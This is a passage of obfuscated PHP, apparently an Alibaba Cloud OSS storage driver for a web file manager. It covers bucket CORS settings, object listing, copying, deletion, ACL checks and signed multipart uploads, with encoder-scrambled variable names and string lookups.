OSS\Model\CorsRule(); $Á²ÃÕÖ¾->addAllowedOrigin($îÙ’»Í«[1400]); $Á²ÃÕÖ¾->addAllowedMethod($îÙ’»Í«[1401]); $Á²ÃÕÖ¾->addAllowedMethod($îÙ’»Í«[1402]); $Á²ÃÕÖ¾->addAllowedMethod($îÙ’»Í«[1403]); $Á²ÃÕÖ¾->addAllowedMethod($îÙ’»Í«[1404]); $Á²ÃÕÖ¾->addAllowedMethod($îÙ’»Í«[160]); $Á²ÃÕÖ¾->setMaxAgeSeconds(600); $Á²ÃÕÖ¾->addExposeHeader($îÙ’»Í«[1405]); $Á²ÃÕÖ¾->addAllowedHeader($îÙ’»Í«[1400]); $°Å÷İ¥->addRule($Á²ÃÕÖ¾); try { $this->client->putBucketCors($this->bucket, $°Å÷İ¥); } catch (OSS\Core\OssException $øïóºã) { return !1; } return !0; } public function getBucketCors() { $éúóğË =& $_SERVER[”ú…±Ú¥]; $‰Å™‚µ˜ = null; try { $‰Å™‚µ˜ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $·š±êƒè) { return null; } if (!$‰Å™‚µ˜ || !($¥ªÄ­™… = $‰Å™‚µ˜->getRules())) { return null; } $‘†æ•Á— = $¥ªÄ­™…[0]->getAllowedOrigins(); $…ñÚÛÌï = $¥ªÄ­™…[0]->getAllowedMethods(); $·šºØù = $¥ªÄ­™…[0]->getMaxAgeSeconds(); $¹ØÃ²»Ò = $¥ªÄ­™…[0]->getExposeHeaders(); $“ùÃõåò = $¥ªÄ­™…[0]->getAllowedHeaders(); return array($éúóğË[198] => isset($‘†æ•Á—[0]) ? $‘†æ•Á—[0] : $éúóğË[12], $éúóğË[202] => $…ñÚÛÌï, $éúóğË[1406] => $·šºØù, $éúóğË[1407] => isset($¹ØÃ²»Ò[0]) ? $¹ØÃ²»Ò[0] : $éúóğË[12], $éúóğË[200] => isset($“ùÃõåò[0]) ? $“ùÃõåò[0] : $éúóğË[12]); } public function isBucketCors() { $¤¾Ôç™ =& $_SERVER[”ú…±Ú¥]; $Ó»“ü•— = $this->getBucketCors(); if (!$Ó»“ü•— || !is_array($Ó»“ü•—)) { return !1; } if ($Ó»“ü•—[$¤¾Ôç™[198]] != $¤¾Ôç™[199] || $Ó»“ü•—[$¤¾Ôç™[200]] != $¤¾Ôç™[199]) { return !1; } $«Ş³¨ŠÌ = array_map($¤¾Ôç™[201], $Ó»“ü•—[$¤¾Ôç™[202]]); if (!is_array($«Ş³¨ŠÌ)) { $«Ş³¨ŠÌ = array(); } $É¨®Í¿‡ = array($¤¾Ôç™[203], $¤¾Ôç™[204], $¤¾Ôç™[205], $¤¾Ôç™[206], $¤¾Ôç™[207]); $í«ô™ùé = array_diff($É¨®Í¿‡, $«Ş³¨ŠÌ); return empty($í«ô™ùé); } public function mkfile($”ĞŒ§Ê¨, $ÆÉ‚Œ¦ª = '', $şÄâÛò• = REPEAT_RENAME) { $Ô­Ü…ƒ‰ = $this->setContent($”ĞŒ§Ê¨, $ÆÉ‚Œ¦ª); if ($Ô­Ü…ƒ‰ !== !1) { return $this->getPathOuter($”ĞŒ§Ê¨); } return !1; } public function mkdir($²ñ‚†Íá, $ÑËÅ‚‹ = REPEAT_SKIP) { if ($ÑËÅ‚‹ && $this->_isFolder($²ñ‚†Íá)) { return $this->getPathOuter($²ñ‚†Íá); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($²ñ‚†Íá)); } catch (OSS\Core\OssException $›ÔÃòù›) { return !1; } return $this->getPathOuter($²ñ‚†Íá); } private function fileList($õÑÁÊô‘, $éû³ÂÒ = '', $—·„´é´ = 0) { $ˆ»œÈŸò =& $_SERVER[”ú…±Ú¥]; $õÑÁÊô‘ = trim($õÑÁÊô‘, $ˆ»œÈŸò[8]); $î­“™ÌĞ = empty($õÑÁÊô‘) && $õÑÁÊô‘ !== $ˆ»œÈŸò[208] ? $ˆ»œÈŸò[12] : $õÑÁÊô‘ . $ˆ»œÈŸò[8]; $¨¨òûá“ = $ˆ»œÈŸò[12]; $ã¬¥ş = 1000; $«ãÎ°Â× = $ìò×£øŒ = array(); while (!0) { check_abort(); $–üˆò™ = array($ˆ»œÈŸò[1408] => $éû³ÂÒ, $ˆ»œÈŸò[1409] => $î­“™ÌĞ, $ˆ»œÈŸò[1410] => $ã¬¥ş, $ˆ»œÈŸò[1411] => $¨¨òûá“); try { $Ó”¯È©ö = $this->client->listObjects($this->bucket, $–üˆò™); } catch (OSS\Core\OssException $åÚ³œñï) { break; } $¨¨òûá“ = $Ó”¯È©ö->getNextMarker(); $Ú™Í¢˜í = $Ó”¯È©ö->getObjectList(); $¹òõÄéÜ = $Ó”¯È©ö->getPrefixList(); foreach ($Ú™Í¢˜í as $ö®¿õËñ) { if ($ö®¿õËñ->getKey() == $î­“™ÌĞ) { continue; } $ÄàŒ«–¯ = $ö®¿õËñ->getKey(); $Şã„ä»û = $ö®¿õËñ->getSize(); $€¢ç™åú = $ö®¿õËñ->getLastModified(); $ç…§êƒ– = $—·„´é´ ? array($ˆ»œÈŸò[32] => $ÄàŒ«–¯, $ˆ»œÈŸò[76] => $Şã„ä»û, $ˆ»œÈŸò[180] => strtotime($€¢ç™åú)) : $ÄàŒ«–¯; $¼¸Šâì¾ = $Şã„ä»û == 0 && substr($ÄàŒ«–¯, strlen($ÄàŒ«–¯) - 1, 1) == $ˆ»œÈŸò[8] ? !0 : !1; $Û³©ş´Á = array($ˆ»œÈŸò[76] => $Şã„ä»û, $ˆ»œÈŸò[1412] => $Şã„ä»û, $ˆ»œÈŸò[85] => strtotime($€¢ç™åú), $ˆ»œÈŸò[1413] => $€¢ç™åú); $this->cacheMethodInfoSet($ÄàŒ«–¯, $¼¸Šâì¾, $Û³©ş´Á); if ($¼¸Šâì¾) { $«ãÎ°Â×[] = $ÄàŒ«–¯; continue; } $ìò×£øŒ[] = $ç…§êƒ–; } foreach ($¹òõÄéÜ as $×›Ëß») { $«ãÎ°Â×[] = $×›Ëß»->getPrefix(); $this->cacheMethodInfoSet($×›Ëß»->getPrefix(), !0); } if ($¨¨òûá“ === $ˆ»œÈŸò[12]) { break; } } $this->cacheMethodInfoSet($õÑÁÊô‘, !0); return array($ˆ»œÈŸò[82] => $«ãÎ°Â×, $ˆ»œÈŸò[83] => $ìò×£øŒ); } public function copyFile($ª³ñË°, $²°óØÉá) { $ò÷Á¬Ê‡ = $this->size($ª³ñË°); if ($ò÷Á¬Ê‡ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ª³ñË°, $this->bucket, $this->pathEncode($²°óØÉá)); } catch (OSS\Core\OssException $Åê’§—ü) { return !1; } return $this->getPathOuter($²°óØÉá); } $š¨©ïŠö = $this->multiCopyObject($ª³ñË°, $²°óØÉá, $ò÷Á¬Ê‡); return $š¨©ïŠö ? $this->getPathOuter($²°óØÉá) : !1; } private function multiCopyObject($±Úã Û˜, $®ÑÄûÑŠ, $üÖú¦à) { $ÒÒ´Š =& $_SERVER[”ú…±Ú¥]; try { $çŞÅ§€ò = array(); if ($²¿¨Ã¡ = $this->hashMd5($±Úã Û˜)) { $çŞÅ§€ò = array(OSS\OssClient::OSS_HEADERS => array($ÒÒ´Š[1414] => $²¿¨Ã¡)); } $ˆ—œú”¸ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($®ÑÄûÑŠ), $çŞÅ§€ò); $»Ò¿ÀãŒ = 1; $ô¼ÀœÄã = 0; $É€ìâöØ = array(); $àÉêı­‹ = 1024 * 1024 * 10; $á×¤š‘® = $this->client->generateMultiuploadParts($üÖú¦à, $àÉêı­‹); foreach ($á×¤š‘® as $ˆßñëşÃ => $ì ±ïØÀ) { $¨ÜùòË¾ = $ô¼ÀœÄã + (int) $ì ±ïØÀ[$ÒÒ´Š[1415]]; $Ü´²·¸Ò = (int) $ì ±ïØÀ[$ÒÒ´Š[375]] + $¨ÜùòË¾ - 1; $¾ü™Ñí‡ = array($ÒÒ´Š[1416] => $¨ÜùòË¾, $ÒÒ´Š[1417] => $Ü´²·¸Ò); $É€ìâöØ[] = $this->client->uploadPartCopy($this->bucket, $±Úã Û˜, $this->bucket, $this->pathEncode($®ÑÄûÑŠ), $»Ò¿ÀãŒ, $ˆ—œú”¸, $¾ü™Ñí‡); $»Ò¿ÀãŒ = $»Ò¿ÀãŒ + 1; } $ÇõúãòÔ = array(); foreach ($É€ìâöØ as $ˆßñëşÃ => $Ãƒ¶æÔà) { $ÇõúãòÔ[] = array($ÒÒ´Š[1418] => $ˆßñëşÃ + 1, $ÒÒ´Š[1419] => $Ãƒ¶æÔà); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($®ÑÄûÑŠ), $ˆ—œú”¸, $ÇõúãòÔ); } catch (OSS\Core\OssException $°ìŞ€°) { return !1; } return !0; } public function moveFile($Ü¸ÏÎÇŞ, $Ú¯ßû†Ñ) { if ($this->copyFile($Ü¸ÏÎÇŞ, $Ú¯ßû†Ñ)) { $this->remove($Ü¸ÏÎÇŞ); return $this->getPathOuter($Ú¯ßû†Ñ); } return !1; } public function delFile($¹á”…Ñ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¹á”…Ñ)); } catch (OSS\Core\OssException $ï™‰…¨ö) { return !1; } return !0; } public function delFolder($†•Â•õ‘) { $Í¬İ¦Ü‡ =& $_SERVER[”ú…±Ú¥]; if (!$this->exist($†•Â•õ‘)) { return !0; } $this->listItemCache = !1; $Õ…Êªõ• = $this->fileList($†•Â•õ‘); $this->listItemCache = !0; $ĞŠ°ÅŸ‚ = trim($†•Â•õ‘, $Í¬İ¦Ü‡[8]) . $Í¬İ¦Ü‡[8]; if (!empty($†•Â•õ‘) && $†•Â•õ‘ !== $Í¬İ¦Ü‡[208] && !in_array($ĞŠ°ÅŸ‚, $Õ…Êªõ•[$Í¬İ¦Ü‡[82]])) { $Õ…Êªõ•[$Í¬İ¦Ü‡[82]][] = $ĞŠ°ÅŸ‚; } $×‰ó´¯ê = $this->delByBatch($Õ…Êªõ•[$Í¬İ¦Ü‡[83]]); if (!$×‰ó´¯ê) { return !1; } $×‰ó´¯ê = $this->delByBatch($Õ…Êªõ•[$Í¬İ¦Ü‡[82]]); if (!$×‰ó´¯ê) { return !1; } return $this->delFile($ĞŠ°ÅŸ‚); } private function delByBatch($¯¦ˆİ¹€) { foreach (array_chunk($¯¦ˆİ¹€, 1000) as $¥·¹ôàÇ) { try { $this->client->deleteObjects($this->bucket, $¥·¹ôàÇ); } catch (OSS\Core\OssException $ã®Ô¾›±) { return !1; } } return !0; } public function rename($Ù¼†ıßí, $ÄÜ˜¸Ñ) { return $this->renameObject($Ù¼†ıßí, $ÄÜ˜¸Ñ); } private function fileInfo($—ã×‰Úı, $ùã¬îô = false, $ÂüƒÕà = array()) { $¾–ò ç =& $_SERVER[”ú…±Ú¥]; $øÉ¥õõâ = array($¾–ò ç[32] => $this->pathThis($—ã×‰Úı), $¾–ò ç[84] => $this->getPathOuter($—ã×‰Úı), $¾–ò ç[33] => $¾–ò ç[210], $¾–ò ç[76] => isset($ÂüƒÕà[$¾–ò ç[76]]) ? $ÂüƒÕà[$¾–ò ç[76]] : 0, $¾–ò ç[174] => $this->ext($—ã×‰Úı)); if ($ùã¬îô) { return $øÉ¥õõâ; } $øÉ¥õõâ[$¾–ò ç[211]] = $øÉ¥õõâ[$¾–ò ç[85]] = 0; $øÉ¥õõâ[$¾–ò ç[212]] = $øÉ¥õõâ[$¾–ò ç[213]] = !0; if (empty($ÂüƒÕà)) { $§ã«¢õƒ = $this->objectMeta($—ã×‰Úı); if (!$§ã«¢õƒ) { return $øÉ¥õõâ; } $ÂüƒÕà = array($¾–ò ç[85] => strtotime($§ã«¢õƒ[$¾–ò ç[1413]]), $¾–ò ç[76] => $§ã«¢õƒ[$¾–ò ç[1412]] + 0); } if (isset($ÂüƒÕà[$¾–ò ç[76]])) { $øÉ¥õõâ[$¾–ò ç[76]] = $ÂüƒÕà[$¾–ò ç[76]]; } if (isset($ÂüƒÕà[$¾–ò ç[85]])) { $øÉ¥õõâ[$¾–ò ç[85]] = $ÂüƒÕà[$¾–ò ç[85]]; } if (isset($ÂüƒÕà[$¾–ò ç[180]]) && !trim($øÉ¥õõâ[$¾–ò ç[85]])) { $øÉ¥õõâ[$¾–ò ç[85]] = $ÂüƒÕà[$¾–ò ç[180]]; } return $øÉ¥õõâ; } private function folderInfo($ììÀÉ¿, $·ü­İÈ = false, $Ô½ø¼Ê€ = array()) { $¸ú„ì­Æ =& $_SERVER[”ú…±Ú¥]; $ß¦‡ü© = array($¸ú„ì­Æ[32] => $this->pathThis($ììÀÉ¿), $¸ú„ì­Æ[84] => $this->getPathOuter($¸ú„ì­Æ[8] . $ììÀÉ¿), $¸ú„ì­Æ[33] => $¸ú„ì­Æ[75]); if ($·ü­İÈ) { return $ß¦‡ü©; } $ß¦‡ü©[$¸ú„ì­Æ[211]] = $ß¦‡ü©[$¸ú„ì­Æ[85]] = 0; $ß¦‡ü©[$¸ú„ì­Æ[212]] = $ß¦‡ü©[$¸ú„ì­Æ[213]] = !0; if (empty($Ô½ø¼Ê€)) { $ììÀÉ¿ = rtrim($ììÀÉ¿, $¸ú„ì­Æ[8]) . $¸ú„ì­Æ[8]; $ˆúËÇ¹ = $this->objectMeta($ììÀÉ¿); if (!$ˆúËÇ¹) { return $ß¦‡ü©; } $Ô½ø¼Ê€ = array($¸ú„ì­Æ[211] => $ˆúËÇ¹[$¸ú„ì­Æ[540]][$¸ú„ì­Æ[1420]], $¸ú„ì­Æ[85] => strtotime($ˆúËÇ¹[$¸ú„ì­Æ[1413]])); } if (isset($Ô½ø¼Ê€[$¸ú„ì­Æ[85]])) { $ß¦‡ü©[$¸ú„ì­Æ[85]] = $Ô½ø¼Ê€[$¸ú„ì­Æ[85]]; } if (isset($Ô½ø¼Ê€[$¸ú„ì­Æ[211]])) { $ß¦‡ü©[$¸ú„ì­Æ[211]] = $Ô½ø¼Ê€[$¸ú„ì­Æ[211]]; } return $ß¦‡ü©; } public function listPath($ÊÓØÀù¦, $‘­À¨Úİ = false) { $”İÙíàÎ =& $_SERVER[”ú…±Ú¥]; $·şØÛìÆ = $this->fileList($ÊÓØÀù¦, $”İÙíàÎ[8], !0); foreach ($·şØÛìÆ[$”İÙíàÎ[82]] as $äÅËæ×¥ => $½–’£¥) { $·şØÛìÆ[$”İÙíàÎ[82]][$äÅËæ×¥] = $this->folderInfo($½–’£¥, $‘­À¨Úİ, $½–’£¥); } foreach ($·şØÛìÆ[$”İÙíàÎ[83]] as $äÅËæ×¥ => $½–’£¥) { $·şØÛìÆ[$”İÙíàÎ[83]][$äÅËæ×¥] = $this->fileInfo($½–’£¥[$”İÙíàÎ[32]], $‘­À¨Úİ, $½–’£¥); } return $·şØÛìÆ; } protected function infoChildren($®½¯´Ú, &$³ƒ„³Ó€) { $òÇÔ¥äş =& $_SERVER[”ú…±Ú¥]; $¯úÀ‰– = $this->fileList($®½¯´Ú, $òÇÔ¥äş[12], !0); $³ƒ„³Ó€[$òÇÔ¥äş[78]] += count($¯úÀ‰–[$òÇÔ¥äş[82]]); $³ƒ„³Ó€[$òÇÔ¥äş[77]] += count($¯úÀ‰–[$òÇÔ¥äş[83]]); foreach ($¯úÀ‰–[$òÇÔ¥äş[83]] as $êÉÒ•„„) { if (!$êÉÒ•„„ || !$êÉÒ•„„[$òÇÔ¥äş[76]]) { continue; } $³ƒ„³Ó€[$òÇÔ¥äş[76]] += $êÉÒ•„„[$òÇÔ¥äş[76]]; } } public function has($Åºáıù™, $Ğç¼­ = false, $Êè°õ­¤ = true) { $ö‡ÔÄ¸Ô =& $_SERVER[”ú…±Ú¥]; $Åºáıù™ = trim($Åºáıù™, $ö‡ÔÄ¸Ô[8]); $ù¬½›÷Ô = empty($Åºáıù™) && $Åºáıù™ !== $ö‡ÔÄ¸Ô[208] ? $ö‡ÔÄ¸Ô[12] : $Åºáıù™ . $ö‡ÔÄ¸Ô[8]; $§å˜ì¥Ç = $ö‡ÔÄ¸Ô[12]; $ø÷»Œõí = 500; $øË¡³ = $öĞÃÒØ¹ = 0; while (!0) { check_abort(); $â§Â²Ä = array($ö‡ÔÄ¸Ô[1408] => $ö‡ÔÄ¸Ô[8], $ö‡ÔÄ¸Ô[1409] => $ù¬½›÷Ô, $ö‡ÔÄ¸Ô[1410] => $ø÷»Œõí, $ö‡ÔÄ¸Ô[1411] => $§å˜ì¥Ç); try { $ÒÇ»½Ó½ = $this->client->listObjects($this->bucket, $â§Â²Ä); } catch (OSS\Core\OssException $Ää¶ßç²) { break; } $§å˜ì¥Ç = $ÒÇ»½Ó½->getNextMarker(); $ÛÄÔÕª = $ÒÇ»½Ó½->getObjectList(); $óäÁêÌ§ = $ÒÇ»½Ó½->getPrefixList(); if ($Ğç¼­) { if (count($ÛÄÔÕª) > 1 || count($ÛÄÔÕª) == 1 && $ÛÄÔÕª[0]->getKey() != $ù¬½›÷Ô) { $øË¡³ += count($ÛÄÔÕª) - 1; } if (!empty($óäÁêÌ§)) { $öĞÃÒØ¹ += count($óäÁêÌ§); } if ($§å˜ì¥Ç === $ö‡ÔÄ¸Ô[12]) { break; } continue; } if ($Êè°õ­¤) { if (!empty($ÛÄÔÕª)) { if (count($ÛÄÔÕª) > 1 || $ÛÄÔÕª[0]->getKey() != $ù¬½›÷Ô) { return !0; } } } else { if (!empty($óäÁêÌ§)) { return !0; } } if ($§å˜ì¥Ç === $ö‡ÔÄ¸Ô[12]) { break; } } if ($Ğç¼­) { return array($ö‡ÔÄ¸Ô[217] => $øË¡³, $ö‡ÔÄ¸Ô[218] => $öĞÃÒØ¹); } return !1; } public function listAll($ÈšÍÅ¡²) { $£à²Ü =& $_SERVER[”ú…±Ú¥]; $ì™åÎÜÊ = $this->fileList($ÈšÍÅ¡², $£à²Ü[12], !0); $›¨–§¦š = array_to_keyvalue($ì™åÎÜÊ[$£à²Ü[83]], $£à²Ü[32]); foreach ($ì™åÎÜÊ[$£à²Ü[82]] as $®ÕŒøÌ) { if (is_string($®ÕŒøÌ)) { $›¨–§¦š[$®ÕŒøÌ] = array($£à²Ü[76] => 0); } } return $this->listAllFiles($ÈšÍÅ¡², $›¨–§¦š); } public function canRead($¥Ş°Ñ‘¨) { $¹±‘í‹Æ =& $_SERVER[”ú…±Ú¥]; $Ÿ«ÕÁì = $this->pathAcl($¥Ş°Ñ‘¨); return $Ÿ«ÕÁì == $¹±‘í‹Æ[1421] || $Ÿ«ÕÁì == $¹±‘í‹Æ[585] ? !0 : !1; } public function canWrite($¤Îã·‡Ó) { $‹ÁÕìù = $this->pathAcl($¤Îã·‡Ó); return $‹ÁÕìù == $_SERVER[”ú…±Ú¥][585] ? !0 : !1; } public function pathAcl($›üì£Ü) { $‚ŞŒË‡Á =& $_SERVER[”ú…±Ú¥]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÖĞá½· = $this->client->getObjectAcl($this->bucket, $this->pathEncode($›üì£Ü)); } catch (OSS\Core\OssException $ú‹…•ÙŒ) { return !1; } $Ñ·Ş¸Îù = $ÖĞá½· == $‚ŞŒË‡Á[37] ? $this->bucketAcl : $ÖĞá½·; if ($Ñ·Ş¸Îù == $‚ŞŒË‡Á[1422]) { return $‚ŞŒË‡Á[1421]; } if ($Ñ·Ş¸Îù == $‚ŞŒË‡Á[1423]) { return $‚ŞŒË‡Á[585]; } return $Ñ·Ş¸Îù; } private function chmodPath($Ãıõ¦¸, $™…½ïš = '') { $¢‹Â¡Õ =& $_SERVER[”ú…±Ú¥]; $«ïìÒ½Ü = empty($™…½ïš) ? $¢‹Â¡Õ[1423] : $™…½ïš; $şêÌˆî™ = array($¢‹Â¡Õ[37], $¢‹Â¡Õ[209], $¢‹Â¡Õ[1422], $¢‹Â¡Õ[1423]); if (!in_array($«ïìÒ½Ü, $şêÌˆî™)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ãıõ¦¸), $«ïìÒ½Ü); } catch (OSS\Core\OssException $è¼¡¼ŠÌ) { return !1; } return !0; } public function getContent($€ÅĞ¸À) { return $this->fileSubstr($€ÅĞ¸À, -1); } public function setContent($ü³¶×µ, $º¾®È›• = '') { $†Ùˆ³¬³ =& $_SERVER[”ú…±Ú¥]; try { $ò±Ø€å¿ = $this->trafficLimit($†Ùˆ³¬³[1424]); $íÃ¼ç•ˆ = $this->client->putObject($this->bucket, $this->pathEncode($ü³¶×µ), $º¾®È›•, $ò±Ø€å¿); } catch (OSS\Core\OssException $ØÇ†»¢) { return !1; } $§ãñ«Ç = array($†Ùˆ³¬³[1414] => trim($íÃ¼ç•ˆ[$†Ùˆ³¬³[1425]], $†Ùˆ³¬³[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ü³¶×µ))); $this->updateObjMeta($ü³¶×µ, $§ãñ«Ç); return isset($íÃ¼ç•ˆ[$†Ùˆ³¬³[1426]][$†Ùˆ³¬³[269]]) ? !0 : !1; } private function updateObjMeta($ê¬Ÿè–¼, $ÓÎ´‚Ù) { $ê¬Ÿè–¼ = $this->pathEncode($ê¬Ÿè–¼); try { $»›ûª­Ì = array(OSS\OssClient::OSS_HEADERS => $ÓÎ´‚Ù); $this->client->copyObject($this->bucket, $ê¬Ÿè–¼, $this->bucket, $ê¬Ÿè–¼, $»›ûª­Ì); } catch (OSS\Core\OssException $åç‰Çšë) { return !1; } return !0; } public function upload($¾˜­Ú±‰, $¦—ÅÉ¤, $õ¼ÃÊÑÛ = false, $“š¼õÇ = REPEAT_REPLACE) { $›åˆ¥şà =& $_SERVER[”ú…±Ú¥]; $Şøõêß¬ = trim($¾˜­Ú±‰, $›åˆ¥şà[8]); $É…×öüÆ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($›åˆ¥şà[1414] => @md5_file($¦—ÅÉ¤)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¾˜­Ú±‰))); $É…×öüÆ = $this->trafficLimit($›åˆ¥şà[1424], $É…×öüÆ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Şøõêß¬), $¦—ÅÉ¤, $É…×öüÆ); } catch (OSS\Core\OssException $’ª¢š´Ñ) { return !1; } return $this->getPathOuter($¾˜­Ú±‰); } public function getHost() { $èĞ–¼ª¶ =& $_SERVER[”ú…±Ú¥]; $×ÂÏÃ¢ª = explode($èĞ–¼ª¶[184], parent::getHost()); return $×ÂÏÃ¢ª[0] . $èĞ–¼ª¶[184] . $this->bucket . $èĞ–¼ª¶[10] . $×ÂÏÃ¢ª[1]; } public function uploadFormData($Ì‰‚¤ÑĞ, $äÅ‚ËÃÒ = 3600) { $áÊ÷Ì¥ =& $_SERVER[”ú…±Ú¥]; if (!($‰Š»ÖÂ = $this->getHost())) { return !1; } $Í„üºœ = $äÅ‚ËÃÒ; $©ğ¸Œ²ï = date($áÊ÷Ì¥[1427], time() + $Í„üºœ); $­¶Üíş = new DateTime($©ğ¸Œ²ï); $¤ƒÊÇÎ = $­¶Üíş->format(DateTime::ISO8601); $ğê¼å• = strpos($¤ƒÊÇÎ, $áÊ÷Ì¥[334]); $¤ƒÊÇÎ = substr($¤ƒÊÇÎ, 0, $ğê¼å•) . $áÊ÷Ì¥[1428]; $¶ìÈÜâ¥ = 1048576000 * 5; $Òé•á®û = $this->pathFather($Ì‰‚¤ÑĞ); $–Ê»¿åÃ = array($áÊ÷Ì¥[252] => $¤ƒÊÇÎ, $áÊ÷Ì¥[255] => array(array($áÊ÷Ì¥[1429], 0, $¶ìÈÜâ¥), array($áÊ÷Ì¥[258], $áÊ÷Ì¥[259], $Òé•á®û))); $É€£æÇâ = base64_encode(json_encode($–Ê»¿åÃ)); $Ö÷•ğ¹ = base64_encode(hash_hmac($áÊ÷Ì¥[241], $É€£æÇâ, $this->secret, !0)); $ÑÈô²âı = array($áÊ÷Ì¥[270] => $É€£æÇâ, $áÊ÷Ì¥[1430] => $this->accessKey, $áÊ÷Ì¥[262] => $áÊ÷Ì¥[251], $áÊ÷Ì¥[1431] => $Ö÷•ğ¹, $áÊ÷Ì¥[182] => $‰Š»ÖÂ); $ÑÈô²âı = $this->trafficLimit($áÊ÷Ì¥[1424], $ÑÈô²âı); return $ÑÈô²âı; } public function multiUploadFormData($èèğë”¬, $úƒ¨ğçò = 3600) { $ãòëĞ¯º =& $_SERVER[”ú…±Ú¥]; if (!($±ë£±ğ‹ = $this->getHost())) { return !1; } $ÍÜ•Ş¦Ñ = $this->trafficLimit($ãòëĞ¯º[1424]); $öèªæÒ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($èèğë”¬), $ÍÜ•Ş¦Ñ); return array($ãòëĞ¯º[233] => $öèªæÒ, $ãòëĞ¯º[182] => $±ë£±ğ‹ . $ãòëĞ¯º[8] . $this->pathEncode($èèğë”¬), $ãòëĞ¯º[234] => gmdate($ãòëĞ¯º[1432]), $ãòëĞ¯º[94] => $èèğë”¬); } public function multiUploadAuthData($–ó™¯åº, $Ï •¯¼ = array()) { $Ï–øÂİ =& $_SERVER[”ú…±Ú¥]; $¥ƒÌı„¨ = isset($Ï •¯¼[$Ï–øÂİ[234]]) ? $Ï •¯¼[$Ï–øÂİ[234]] : gmdate($Ï–øÂİ[1432]); $Ë£™…Ğí = isset($Ï •¯¼[$Ï–øÂİ[174]]) ? $Ï •¯¼[$Ï–øÂİ[174]] : $Ï–øÂİ[12]; $‹†Í†Ì‘ = $–ó™¯åº; if (isset($Ï •¯¼[$Ï–øÂİ[94]])) { $‹†Í†Ì‘ = $Ï •¯¼[$Ï–øÂİ[94]]; unset($Ï •¯¼[$Ï–øÂİ[94]]); } if (isset($Ï •¯¼[$Ï–øÂİ[235]])) { $Ï •¯¼[$Ï–øÂİ[234]] = $¥ƒÌı„¨; return $this->listUploadParts($‹†Í†Ì‘, $Ï •¯¼); } $Å¦¶íÄ÷ = array($Ï–øÂİ[236], $Ï–øÂİ[12], $Ï–øÂİ[120], $¥ƒÌı„¨, "\x78\x2d\157\x73\x73\x2d\144\141\x74\145\72{$¥ƒÌı„¨}", $Ï–øÂİ[8] . $this->bucket . $Ï–øÂİ[8] . $‹†Í†Ì‘ . $Ë£™…Ğí); if (strpos($Ë£™…Ğí, $Ï–øÂİ[237]) === 0) { $Å¦¶íÄ÷[0] = $Ï–øÂİ[238]; if ($”Ï²úè = $this->trafficLimit($Ï–øÂİ[1424])) { $‹†Í†Ì‘ = $Ï–øÂİ[1433]; array_splice($Å¦¶íÄ÷, 5, 0, $‹†Í†Ì‘ . $Ï–øÂİ[4] . $”Ï²úè[$‹†Í†Ì‘]); } } if (isset($Ï •¯¼[$Ï–øÂİ[239]]) && $Ï •¯¼[$Ï–øÂİ[239]] == $Ï–øÂİ[240]) { $Å¦¶íÄ÷[0] = $Ï–øÂİ[240]; } if (!empty($Ï •¯¼[$Ï–øÂİ[1434]])) { $Ì ‡¥ı™ = array_merge(array($Å¦¶íÄ÷[4]), $Ï •¯¼[$Ï–øÂİ[1434]]); sort($Ì ‡¥ı™); $Å¦¶íÄ÷[4] = implode($Ï–øÂİ[191], $Ì ‡¥ı™); } $¤‹‘»¡ë = implode($Ï–øÂİ[191], $Å¦¶íÄ÷); $Æøáúé = base64_encode(hash_hmac($Ï–øÂİ[241], $¤‹‘»¡ë, $this->secret, !0)); $×„°˜Áê = $Ï–øÂİ[1398] . $this->accessKey . $Ï–øÂİ[4] . $Æøáúé; if (strpos($Ë£™…Ğí, $Ï–øÂİ[237]) === 0) { $×„°˜Áê = array($Ï–øÂİ[243] => $×„°˜Áê, $Ï–øÂİ[234] => $¥ƒÌı„¨); if ($”Ï²úè) { $×„°˜Áê = array_merge($×„°˜Áê, $”Ï²úè); } } return $×„°˜Áê; } public function listUploadParts($¾ôñè­, $Ñ»ºêàÍ) { $ø«ğÂÁ =& $_SERVER[”ú…±Ú¥]; $ìıÄ•‰ = parse_url_query($Ñ»ºêàÍ[$ø«ğÂÁ[174]]); $ÌèªÒü˜ = $this->client->listParts($this->bucket, $this->pathEncode($¾ôñè­), $ìıÄ•‰[$ø«ğÂÁ[233]]); $ıÎÕ·¹ = $ÌèªÒü˜->getListPart(); $‡¦“Şºû = array(); foreach ($ıÎÕ·¹ as $á×©Ôˆ) { $‡¦“Şºû[] = array($ø«ğÂÁ[1418] => $á×©Ôˆ->getPartNumber(), $ø«ğÂÁ[1419] => trim($á×©Ôˆ->getETag(), $ø«ğÂÁ[118])); } unset($Ñ»ºêàÍ[$ø«ğÂÁ[235]], $Ñ»ºêàÍ[$ø«ğÂÁ[239]]); $ö¦ƒ¼‰º = $this->multiUploadAuthData($¾ôñè­, $Ñ»ºêàÍ); if (empty($ö¦ƒ¼‰º)) { return !1; } return array($ø«ğÂÁ[243] => $ö¦ƒ¼‰º, $ø«ğÂÁ[234] => $Ñ»ºêàÍ[$ø«ğÂÁ[234]], $ø«ğÂÁ[245] => $‡¦“Şºû); } public function download($…ğ ıÉè, $ØÊ¡œ€Ä) { if ($this->isFolder($…ğ ıÉè)) { return !1; } try { $áÅÛ‚¦– = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ØÊ¡œ€Ä); $áÅÛ‚¦– = $this->trafficLimit($_SERVER[”ú…±Ú¥][109], $áÅÛ‚¦–); $this->client->getObject($this->bucket, $this->pathEncode($…ğ ıÉè), $áÅÛ‚¦–); } catch (OSS\Core\OssException $ÅŠòâÇ¹) { return !1; } return $ØÊ¡œ€Ä; } public function fileSubstr($ËëÀ¹¾Ó, $µºè‘‡Æ = 0, $Ô—œËĞ´ = false) { if ($µºè‘‡Æ === 